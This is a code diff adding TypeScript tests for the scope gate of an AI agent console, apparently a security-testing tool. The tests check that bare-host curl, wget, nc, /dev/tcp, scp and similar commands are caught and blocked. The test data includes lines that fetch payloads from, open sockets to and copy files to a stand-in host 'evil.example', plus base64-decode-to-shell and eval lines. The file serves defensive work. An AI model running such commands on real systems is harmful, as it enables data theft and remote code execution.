@@ -790,6 +790,13 @@ describe("Console autonomy — approval integrity", () => {
     const session = createConsoleSession({
       runtime,
       autonomyMode: "copilot",
+      // A scope is REQUIRED for the yolo leg of this test: yolo now means
+      // "no prompts inside an authorized scope", and the engine-level
+      // `guardNetworkRequiresScope` denies every network-capable tool (`bash`
+      // included) when a yolo session has no scope at all. The scope covers a
+      // host none of these commands touch — its only job here is to establish
+      // that the session IS scoped, which is the precondition yolo asserts.
+      scope: ScopePolicy.fromJson({ in_scope: ["mode-transitions.test"] }),
       approveTool: async () => {
         approvals += 1;
         return false; // always deny in copilot
@@ -1558,5 +1565,434 @@ describe("monotonic guard floor", () => {
 
     expect(outcome.toolCalls[0].result.success).toBe(false);
     expect(outcome.toolCalls[0].result.error).toContain("no approval mechanism is available");
+  });
+});
+
+// ── Schemeless shell-target extraction + the unresolved-destination gate ──
+//
+// The scope gate used to collect targets with a single `https?://` regex over
+// the tool arguments. Everything a shell can do without a scheme — a bare host
+// argument to curl/wget/nc, an IP literal, bash's `/dev/tcp` socket — produced
+// ZERO extracted URLs, and zero extracted URLs meant "approved". These tests
+// pin both halves of the fix: the schemeless forms are now seen, and a
+// network-reaching command whose destination cannot be read is escalated
+// instead of approved.
+
+describe("Console scope gate — schemeless shell destinations", () => {
+  /** A single `bash` turn carrying `command`, then a stop. */
+  function bashTurn(id: string, command: string): NativeRuntimeResult {
+    return {
+      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
+      stopReason: "tool_use",
+      durationMs: 1,
+    };
+  }
+
+  /**
+   * Run one shell command through a fresh standard-mode session whose operator
+   * declines every scope request. Returns the recorded requests plus the tool
+   * result, so a test can assert BOTH what was extracted and that the call was
+   * actually blocked. A fresh session per case matters: denied-host memory
+   * would otherwise suppress the prompt for the second case onward.
+   */
+  async function probeCommand(command: string): Promise<{
+    requests: ConsoleScopeRequest[];
+    outcome: Awaited<ReturnType<ReturnType<typeof createConsoleSession>["send"]>>;
+  }> {
+    const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
+    const requests: ConsoleScopeRequest[] = [];
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "standard",
+      requestScope: async (req) => {
+        requests.push(req);
+        return null; // decline, so the tool is never actually dispatched
+      },
+    });
+    const outcome = await session.send("go");
+    return { requests, outcome };
+  }
+
+  /** Every case the old extractor missed, plus the one it already caught. */
+  const cases: Array<{ command: string; host: string; port?: string }> = [
+    { command: "curl https://evil.example/x", host: "evil.example" },
+    { command: "curl evil.example/x", host: "evil.example" },
+    { command: "curl -sS evil.example", host: "evil.example" },
+    { command: "wget evil.example/payload", host: "evil.example" },
+    { command: "nc evil.example 443", host: "evil.example", port: "443" },
+    { command: "curl 203.0.113.7/x", host: "203.0.113.7" },
+    { command: "bash -c 'exec 3<>/dev/tcp/evil.example/443'", host: "evil.example", port: "443" },
+  ];
+
+  for (const testCase of cases) {
+    it(`extracts and gates: ${testCase.command}`, async () => {
+      const { requests, outcome } = await probeCommand(testCase.command);
+
+      // The operator was asked — the call did not sail through on "no URL found".
+      expect(requests).toHaveLength(1);
+      const hosts = requests[0].requestedUrls.map((u) => new URL(u).hostname);
+      expect(hosts).toContain(testCase.host);
+      if (testCase.port) {
+        // Asserted on the raw normalized string: `new URL(...).port` is "" for a
+        // scheme-default port, which would hide a correctly recovered `:443`.
+        expect(requests[0].requestedUrls.some((u) => u.includes(`:${testCase.port}`))).toBe(true);
+      }
+      // And declining actually blocked it.
+      expect(outcome.toolCalls).toHaveLength(1);
+      expect(outcome.toolCalls[0].result.success).toBe(false);
+      expect(outcome.toolCalls[0].result.error).toContain("denied");
+    });
+  }
+
+  it("sees more exotic clients too (ssh, telnet, dig, openssl s_client, ping)", async () => {
+    for (const command of [
+      "ssh operator@evil.example",
+      "telnet evil.example 23",
+      "dig evil.example",
+      "openssl s_client -connect evil.example:443",
+      "ping -c 1 evil.example",
+      "scp report.txt operator@evil.example:/tmp/",
+    ]) {
+      const { requests } = await probeCommand(command);
+      expect(
+        requests.flatMap((r) => r.requestedUrls).map((u) => new URL(u).hostname),
+        `command: ${command}`,
+      ).toContain("evil.example");
+    }
+  });
+
+  it("finds a destination hidden inside a quoted sub-shell", async () => {
+    const { requests } = await probeCommand(`sh -c 'wget evil.example/stage2'`);
+    expect(requests[0].requestedUrls.map((u) => new URL(u).hostname)).toContain("evil.example");
+  });
+});
+
+describe("Console scope gate — the false-positive line", () => {
+  function bashTurn(id: string, command: string): NativeRuntimeResult {
+    return {
+      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
+      stopReason: "tool_use",
+      durationMs: 1,
+    };
+  }
+
+  it("does not prompt or deny `bash echo hello`, even with a session target set", async () => {
+    // The old fallback substituted the SESSION TARGET whenever no URL was
+    // found, so a purely local command was validated against a host it was
+    // never going to contact — and prompted when that host was unscoped. Both
+    // the bogus validation and the bogus prompt are gone.
+    const runtime = new ScriptedRuntime([bashTurn("c1", "echo hello"), endTurn("done")]);
+    let prompts = 0;
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "standard",
+      target: "https://engagement.test",
+      requestScope: async () => {
+        prompts += 1;
+        return null;
+      },
+    });
+
+    const outcome = await session.send("say hello");
+    expect(prompts).toBe(0);
+    expect(outcome.toolCalls).toHaveLength(1);
+    expect(outcome.toolCalls[0].result.success).toBe(true);
+  });
+
+  it("leaves ordinary local shell work alone (no client, no IP, no opaque exec)", async () => {
+    for (const command of [
+      "echo hello",
+      "ls -la /tmp",
+      "grep -rn TODO src/",
+      "cat package.json",
+      "git status --short",
+    ]) {
+      const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
+      let prompts = 0;
+      const session = createConsoleSession({
+        runtime,
+        autonomyMode: "copilot",
+        target: "https://engagement.test",
+        requestScope: async () => {
+          prompts += 1;
+          return null;
+        },
+        // Copilot denies before dispatch, so nothing is actually executed; the
+        // assertion of interest is that the SCOPE gate never fired.
+        approveTool: async () => false,
+      });
+      const outcome = await session.send("work");
+      expect(prompts, `command: ${command}`).toBe(0);
+      expect(outcome.toolCalls[0].result.error, `command: ${command}`).toContain("not approved");
+    }
+  });
+
+  it("leaves a structured non-shell tool with no URL untouched (read_file)", async () => {
+    const runtime = new ScriptedRuntime([
+      { content: [{ type: "tool_use", id: "c1", name: "read_file", input: { path: "/etc/hostname" } }], stopReason: "tool_use", durationMs: 1 },
+      endTurn("done"),
+    ]);
+    let prompts = 0;
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "standard",
+      target: "https://engagement.test",
+      requestScope: async () => {
+        prompts += 1;
+        return null;
+      },
+    });
+
+    const outcome = await session.send("read it");
+    expect(prompts).toBe(0);
+    expect(outcome.toolCalls).toHaveLength(1);
+    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("Scope request");
+  });
+});
+
+describe("Console scope gate — schemeless hosts against a real scope", () => {
+  function bashTurn(id: string, command: string): NativeRuntimeResult {
+    return {
+      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
+      stopReason: "tool_use",
+      durationMs: 1,
+    };
+  }
+
+  it("allows a schemeless host that the engagement scope covers", async () => {
+    const runtime = new ScriptedRuntime([bashTurn("c1", "curl -sS allowed.test/health"), endTurn("done")]);
+    let prompts = 0;
+    const session = createConsoleSession({
+      runtime,
+      // Copilot with a denying approveTool: the copilot gate stops the command
+      // from actually reaching the network, so passing the SCOPE gate is
+      // observable as "no scope prompt, denied by approval instead".
+      autonomyMode: "copilot",
+      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
+      requestScope: async () => {
+        prompts += 1;
+        return null;
+      },
+      approveTool: async () => false,
+    });
+
+    const outcome = await session.send("check health");
+    expect(prompts).toBe(0); // in scope → the scope gate approved silently
+    expect(outcome.toolCalls[0].result.error).toContain("not approved");
+  });
+
+  it("prompts for a schemeless host the engagement scope does not cover", async () => {
+    const runtime = new ScriptedRuntime([bashTurn("c1", "curl -sS elsewhere.test/health"), endTurn("done")]);
+    const requests: ConsoleScopeRequest[] = [];
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "standard",
+      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
+      requestScope: async (req) => {
+        requests.push(req);
+        return null;
+      },
+    });
+
+    const outcome = await session.send("check elsewhere");
+    expect(requests).toHaveLength(1);
+    expect(requests[0].requestedUrls.map((u) => new URL(u).hostname)).toContain("elsewhere.test");
+    expect(outcome.toolCalls[0].result.success).toBe(false);
+  });
+
+  it("hard-denies an out-of-scope schemeless host in yolo without prompting", async () => {
+    const runtime = new ScriptedRuntime([bashTurn("c1", "curl elsewhere.test/x"), endTurn("done")]);
+    let prompts = 0;
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "yolo",
+      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
+      requestScope: async () => {
+        prompts += 1;
+        return null;
+      },
+    });
+
+    const outcome = await session.send("go");
+    expect(prompts).toBe(0);
+    expect(outcome.toolCalls[0].result.success).toBe(false);
+    expect(outcome.toolCalls[0].result.error).toContain("YOLO mode");
+    expect(outcome.toolCalls[0].result.error).toContain("elsewhere.test");
+  });
+
+  it("applies denied-host memory to a newly extracted schemeless host", async () => {
+    // The declined host is only visible through the new extraction path — the
+    // old regex would have produced no URL at all, so there would have been
+    // nothing to remember.
+    const runtime = new ScriptedRuntime([
+      bashTurn("c1", "curl memory.test/a"),
+      endTurn("declined"),
+      bashTurn("c2", "wget memory.test/b"),
+      endTurn("auto-denied"),
+    ]);
+    let prompts = 0;
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "standard",
+      requestScope: async () => {
+        prompts += 1;
+        return null;
+      },
+    });
+
+    await session.send("hit memory.test");
+    const second = await session.send("hit memory.test again");
+    expect(prompts).toBe(1);
+    expect(second.toolCalls[0].result.error).toContain("already declined");
+  });
+});
+
+describe("Console scope gate — unresolvable shell destinations", () => {
+  function bashTurn(id: string, command: string): NativeRuntimeResult {
+    return {
+      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
+      stopReason: "tool_use",
+      durationMs: 1,
+    };
+  }
+
+  const opaque = [
+    `curl "$TARGET"`,
+    "curl $(cat /tmp/host)",
+    "echo aGVsbG8= | base64 -d | sh",
+    "eval $PAYLOAD",
+  ];
+
+  it("escalates an unreadable network destination to the operator in standard mode", async () => {
+    for (const command of opaque) {
+      const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
+      const requests: ConsoleScopeRequest[] = [];
+      const session = createConsoleSession({
+        runtime,
+        autonomyMode: "standard",
+        requestScope: async (req) => {
+          requests.push(req);
+          return null;
+        },
+      });
+
+      const outcome = await session.send("go");
+      // The operator is asked — and the request carries the actual call, so the
+      // surface can show the command even though there is no URL to show.
+      expect(requests, `command: ${command}`).toHaveLength(1);
+      expect(requests[0].unresolvedTargets ?? [], `command: ${command}`).not.toHaveLength(0);
+      expect(requests[0].call.arguments).toEqual({ command });
+      expect(outcome.toolCalls[0].result.success, `command: ${command}`).toBe(false);
+    }
+  });
+
+  it("denies an unreadable network destination in yolo, even inside a scope, without prompting", async () => {
+    const runtime = new ScriptedRuntime([bashTurn("c1", `curl "$TARGET"`), endTurn("done")]);
+    let prompts = 0;
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "yolo",
+      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
+      requestScope: async () => {
+        prompts += 1;
+        return null;
+      },
+    });
+
+    const outcome = await session.send("go");
+    expect(prompts).toBe(0);
+    expect(outcome.toolCalls[0].result.success).toBe(false);
+    expect(outcome.toolCalls[0].result.error).toContain("YOLO mode");
+    expect(outcome.toolCalls[0].result.error).toContain("cannot resolve");
+  });
+
+  it("remembers a declined opaque command instead of re-prompting for it", async () => {
+    const runtime = new ScriptedRuntime([
+      bashTurn("c1", `curl "$TARGET"`),
+      endTurn("declined"),
+      bashTurn("c2", `curl "$TARGET"`),
+      endTurn("auto-denied"),
+    ]);
+    let prompts = 0;
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "standard",
+      requestScope: async () => {
+        prompts += 1;
+        return null;
+      },
+    });
+
+    await session.send("go");
+    const second = await session.send("go again");
+    expect(prompts).toBe(1);
+    expect(second.toolCalls[0].result.error).toContain("already declined");
+  });
+
+  it("still falls through to the executor when no requestScope callback is wired", async () => {
+    // The legacy readline console has no scope-approval mechanism; behaviour
+    // there is unchanged (the executor's own validation governs). The new gate
+    // must not turn "no callback" into a denial.
+    const runtime = new ScriptedRuntime([bashTurn("c1", "echo ok"), endTurn("done")]);
+    const session = createConsoleSession({ runtime, autonomyMode: "standard" });
+    const outcome = await session.send("go");
+    expect(outcome.toolCalls[0].result.success).toBe(true);
+  });
+});
+
+describe("Console autonomy — yolo requires a configured scope (engine-level)", () => {
+  it("hard-denies a network-capable tool in yolo with no scope, without prompting", async () => {
+    // The TUI refuses `/mode yolo` without a scope, but a session can be
+    // CONSTRUCTED in that state directly. The invariant is enforced here so it
+    // does not depend on a UI check: `bash` is network-capable, and a yolo
+    // session with no scope has no authorized scope for "no prompts inside an
+    // authorized scope" to be relative to.
+    const runtime = new ScriptedRuntime([
+      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
+      endTurn("done"),
+    ]);
+    let prompts = 0;
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "yolo",
+      requestScope: async () => {
+        prompts += 1;
+        return null;
+      },
+      approveTool: async () => {
+        throw new Error("approveTool must not be called in yolo mode");
+      },
+    });
+
+    const outcome = await session.send("go");
+    expect(prompts).toBe(0);
+    expect(outcome.toolCalls).toHaveLength(1);
+    expect(outcome.toolCalls[0].result.success).toBe(false);
+    expect(outcome.toolCalls[0].result.error).toContain("no scope is configured");
+  });
+
+  it("lets the same call through once a scope is configured", async () => {
+    const runtime = new ScriptedRuntime([
+      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
+      endTurn("done"),
+    ]);
+    const session = createConsoleSession({
+      runtime,
+      autonomyMode: "yolo",
+      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
+    });
+
+    const outcome = await session.send("go");
+    expect(outcome.toolCalls[0].result.success).toBe(true);
+  });
+
+  it("does not restrict non-network tools in yolo without a scope", async () => {
+    const runtime = new ScriptedRuntime([
+      { content: [{ type: "tool_use", id: "c1", name: "payload_lookup", input: { name: "jsfuck_alert" } }], stopReason: "tool_use", durationMs: 1 },
+      endTurn("done"),
+    ]);
+    const session = createConsoleSession({ runtime, autonomyMode: "yolo" });
+    const outcome = await session.send("go");
+    expect(outcome.toolCalls[0].result.success).toBe(true);
   });
 });
